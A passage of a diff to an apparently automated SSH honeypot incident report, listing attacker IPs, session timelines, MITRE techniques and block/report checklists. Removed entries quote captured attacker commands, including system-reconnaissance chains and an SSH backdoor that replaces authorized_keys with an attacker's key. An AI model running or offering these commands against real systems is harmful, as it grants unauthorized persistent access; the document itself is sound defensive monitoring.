-| `2026-08-22 13:33:34` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:33:39` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
-- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-c50813787176
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `116.48.143[.]166` |
-| **First Seen** | 2026-08-22 13:33 |
-| **Last Seen** | 2026-08-22 13:33 |
+| **Source IP** | `27.115.72[.]122` |
+| **First Seen** | 2026-08-22 16:17 |
+| **Last Seen** | 2026-08-22 16:17 |
 | **Session Duration** | 10s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -2070,27 +4210,27 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:33:44` | `cowrie.session.connect` |
-| `2026-08-22 13:33:45` | `cowrie.client.version` |
-| `2026-08-22 13:33:45` | `cowrie.client.kex` |
-| `2026-08-22 13:33:48` | `cowrie.login.success` |
-| `2026-08-22 13:33:49` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:33:55` | `cowrie.session.closed` |
+| `2026-08-22 16:17:40` | `cowrie.session.connect` |
+| `2026-08-22 16:17:41` | `cowrie.client.version` |
+| `2026-08-22 16:17:41` | `cowrie.client.kex` |
+| `2026-08-22 16:17:44` | `cowrie.login.success` |
+| `2026-08-22 16:17:45` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:17:51` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
-- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
+- [ ] Submit `27.115.72[.]122` to AbuseIPDB if not already reported
+- [ ] Block `27.115.72[.]122` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-aa52fbb9c47d
+### 🔴 HIGH · IR-e2473ac29860
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:33 |
-| **Last Seen** | 2026-08-22 13:33 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:19 |
+| **Last Seen** | 2026-08-22 16:19 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -2101,151 +4241,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:33:46` | `cowrie.session.connect` |
-| `2026-08-22 13:33:46` | `cowrie.client.version` |
-| `2026-08-22 13:33:46` | `cowrie.client.kex` |
-| `2026-08-22 13:33:47` | `cowrie.login.success` |
-| `2026-08-22 13:33:48` | `cowrie.session.params` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.success` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:48` | `cowrie.command.input` |
-| `2026-08-22 13:33:49` | `cowrie.log.closed` |
-| `2026-08-22 13:33:49` | `cowrie.session.closed` |
+| `2026-08-22 16:19:02` | `cowrie.session.connect` |
+| `2026-08-22 16:19:02` | `cowrie.client.version` |
+| `2026-08-22 16:19:02` | `cowrie.client.kex` |
+| `2026-08-22 16:19:02` | `cowrie.login.success` |
+| `2026-08-22 16:19:04` | `cowrie.session.params` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.success` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.command.input` |
+| `2026-08-22 16:19:04` | `cowrie.log.closed` |
+| `2026-08-22 16:19:04` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-b9371b231f39
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `176.53.159[.]196` |
-| **First Seen** | 2026-08-22 13:34 |
-| **Last Seen** | 2026-08-22 13:34 |
-| **Session Duration** | 0s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:34:57` | `cowrie.session.connect` |
-| `2026-08-22 13:34:57` | `cowrie.client.version` |
-| `2026-08-22 13:34:57` | `cowrie.client.kex` |
-| `2026-08-22 13:34:58` | `cowrie.login.success` |
-| `2026-08-22 13:34:58` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:34:58` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:34:58` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
-- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-723d537bbe8b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:35 |
-| **Last Seen** | 2026-08-22 13:35 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:35:40` | `cowrie.session.connect` |
-| `2026-08-22 13:35:40` | `cowrie.client.version` |
-| `2026-08-22 13:35:40` | `cowrie.client.kex` |
-| `2026-08-22 13:35:42` | `cowrie.login.success` |
-| `2026-08-22 13:35:43` | `cowrie.session.params` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.success` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.command.input` |
-| `2026-08-22 13:35:43` | `cowrie.log.closed` |
-| `2026-08-22 13:35:43` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-fb260dfdbce9
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:37 |
-| **Last Seen** | 2026-08-22 13:37 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:37:23` | `cowrie.session.connect` |
-| `2026-08-22 13:37:23` | `cowrie.client.version` |
-| `2026-08-22 13:37:23` | `cowrie.client.kex` |
-| `2026-08-22 13:37:24` | `cowrie.login.success` |
-| `2026-08-22 13:37:25` | `cowrie.session.params` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.success` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:25` | `cowrie.command.input` |
-| `2026-08-22 13:37:26` | `cowrie.log.closed` |
-| `2026-08-22 13:37:26` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-57710533154f
+### 🔴 HIGH · IR-e956efa8a923
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:38 |
-| **Last Seen** | 2026-08-22 13:38 |
+| **First Seen** | 2026-08-22 16:19 |
+| **Last Seen** | 2026-08-22 16:20 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -2256,14 +4282,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:38:18` | `cowrie.session.connect` |
-| `2026-08-22 13:38:18` | `cowrie.client.version` |
-| `2026-08-22 13:38:18` | `cowrie.client.kex` |
-| `2026-08-22 13:38:19` | `cowrie.login.success` |
-| `2026-08-22 13:38:19` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:38:19` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:38:19` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:38:20` | `cowrie.session.closed` |
+| `2026-08-22 16:19:59` | `cowrie.session.connect` |
+| `2026-08-22 16:19:59` | `cowrie.client.version` |
+| `2026-08-22 16:19:59` | `cowrie.client.kex` |
+| `2026-08-22 16:20:00` | `cowrie.login.success` |
+| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:20:01` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -2272,13 +4298,13 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-55b1a250e47f
+### 🔴 HIGH · IR-bfe646192ddd
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:38 |
-| **Last Seen** | 2026-08-22 13:38 |
+| **First Seen** | 2026-08-22 16:20 |
+| **Last Seen** | 2026-08-22 16:20 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -2289,14 +4315,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:38:22` | `cowrie.session.connect` |
-| `2026-08-22 13:38:22` | `cowrie.client.version` |
-| `2026-08-22 13:38:23` | `cowrie.client.kex` |
-| `2026-08-22 13:38:23` | `cowrie.login.success` |
-| `2026-08-22 13:38:24` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:38:24` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:38:24` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:38:24` | `cowrie.session.closed` |
+| `2026-08-22 16:20:02` | `cowrie.session.connect` |
+| `2026-08-22 16:20:02` | `cowrie.client.version` |
+| `2026-08-22 16:20:03` | `cowrie.client.kex` |
+| `2026-08-22 16:20:04` | `cowrie.login.success` |
+| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:20:04` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -2305,218 +4331,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-5336d394e805
+### 🔴 HIGH · IR-a5310cb14bc9
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:39 |
-| **Last Seen** | 2026-08-22 13:39 |
+| **Source IP** | `41.63.63[.]211` |
+| **First Seen** | 2026-08-22 16:25 |
+| **Last Seen** | 2026-08-22 16:25 |
 | **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:39:03` | `cowrie.session.connect` |
-| `2026-08-22 13:39:04` | `cowrie.client.version` |
-| `2026-08-22 13:39:04` | `cowrie.client.kex` |
-| `2026-08-22 13:39:05` | `cowrie.login.success` |
-| `2026-08-22 13:39:06` | `cowrie.session.params` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.success` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:06` | `cowrie.command.input` |
-| `2026-08-22 13:39:07` | `cowrie.log.closed` |
-| `2026-08-22 13:39:07` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-58473c9abd3b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:40 |
-| **Last Seen** | 2026-08-22 13:40 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:40:41` | `cowrie.session.connect` |
-| `2026-08-22 13:40:41` | `cowrie.client.version` |
-| `2026-08-22 13:40:41` | `cowrie.client.kex` |
-| `2026-08-22 13:40:43` | `cowrie.login.success` |
-| `2026-08-22 13:40:44` | `cowrie.session.params` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.success` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.command.input` |
-| `2026-08-22 13:40:44` | `cowrie.log.closed` |
-| `2026-08-22 13:40:45` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e0f3f3129332
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:42 |
-| **Last Seen** | 2026-08-22 13:42 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:42:21` | `cowrie.session.connect` |
-| `2026-08-22 13:42:22` | `cowrie.client.version` |
-| `2026-08-22 13:42:22` | `cowrie.client.kex` |
-| `2026-08-22 13:42:24` | `cowrie.login.success` |
-| `2026-08-22 13:42:25` | `cowrie.session.params` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.success` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:25` | `cowrie.command.input` |
-| `2026-08-22 13:42:26` | `cowrie.log.closed` |
-| `2026-08-22 13:42:26` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-39bcb5bbaab0
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:44 |
-| **Last Seen** | 2026-08-22 13:44 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:44:43` | `cowrie.session.connect` |
-| `2026-08-22 13:44:43` | `cowrie.client.version` |
-| `2026-08-22 13:44:43` | `cowrie.client.kex` |
-| `2026-08-22 13:44:45` | `cowrie.login.success` |
-| `2026-08-22 13:44:47` | `cowrie.session.params` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.success` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.command.input` |
-| `2026-08-22 13:44:47` | `cowrie.log.closed` |
-| `2026-08-22 13:44:47` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-389e33ab6067
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `196.196.150[.]99` |
-| **First Seen** | 2026-08-22 13:45 |
-| **Last Seen** | 2026-08-22 13:45 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:45:30` | `cowrie.session.connect` |
-| `2026-08-22 13:45:30` | `cowrie.client.version` |
-| `2026-08-22 13:45:30` | `cowrie.client.kex` |
-| `2026-08-22 13:45:31` | `cowrie.login.success` |
-| `2026-08-22 13:45:32` | `cowrie.session.params` |
-| `2026-08-22 13:45:32` | `cowrie.command.input` |
-| `2026-08-22 13:45:32` | `cowrie.command.failed` |
-| `2026-08-22 13:45:32` | `cowrie.log.closed` |
-| `2026-08-22 13:45:32` | `cowrie.session.params` |
-| `2026-08-22 13:45:32` | `cowrie.command.input` |
-| `2026-08-22 13:45:32` | `cowrie.session.file_download` |
-| `2026-08-22 13:45:32` | `cowrie.log.closed` |
-| `2026-08-22 13:45:34` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `196.196.150[.]99` to AbuseIPDB if not already reported
-- [ ] Block `196.196.150[.]99` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Run Tool 31 malware analyzer on captured payload(s)
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-dd713eb548eb
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `196.196.150[.]99` |
-| **First Seen** | 2026-08-22 13:45 |
-| **Last Seen** | 2026-08-22 13:45 |
-| **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **TTPs (MITRE)** | T1078 · T1592 |
@@ -2525,186 +4347,348 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:45:33` | `cowrie.session.connect` |
-| `2026-08-22 13:45:33` | `cowrie.client.version` |
-| `2026-08-22 13:45:33` | `cowrie.client.kex` |
-| `2026-08-22 13:45:33` | `cowrie.login.success` |
-| `2026-08-22 13:45:33` | `cowrie.session.closed` |
+| `2026-08-22 16:25:33` | `cowrie.session.connect` |
+| `2026-08-22 16:25:33` | `cowrie.client.version` |
+| `2026-08-22 16:25:34` | `cowrie.client.kex` |
